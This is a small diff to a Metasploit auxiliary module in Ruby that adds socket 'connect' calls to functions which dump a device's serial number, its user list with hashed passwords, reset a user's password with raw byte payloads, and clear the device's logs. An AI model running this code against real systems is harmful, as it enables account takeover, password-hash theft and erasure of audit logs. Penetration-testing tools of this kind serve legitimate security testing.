@@ -91,6 +91,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def grab_serial
+    connect
     sock.put(SN)
     data = sock.get_once
     if data =~ /[\x00]{8,}([[:print:]]+)/
@@ -195,10 +196,10 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def grab_users
-    usercount = 0
     connect
     sock.put(USERS)
     if data = sock.get_once.split('&&')
+      usercount = 0
       print_status("Users\\Hashed Passwords\\Rights\\Description: @ #{rhost}:#{rport}!")
       data.each do |val|
         usercount += 1
@@ -234,6 +235,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def reset_user
+    connect
     userstring = datastore['USERNAME'] + ":Intel:" + @password + ":" + @password
     u1 = "\xa4\x00\x00\x00\x00\x00\x00\x00\x1a\x00\x00\x00\x00\x00\x00\x00" \
          "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
@@ -252,6 +254,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def clear_logs
+    connect
     sock.put(CLEAR_LOGS1)
     sock.put(CLEAR_LOGS2)
     print_good("#{peer} -- logs cleared")
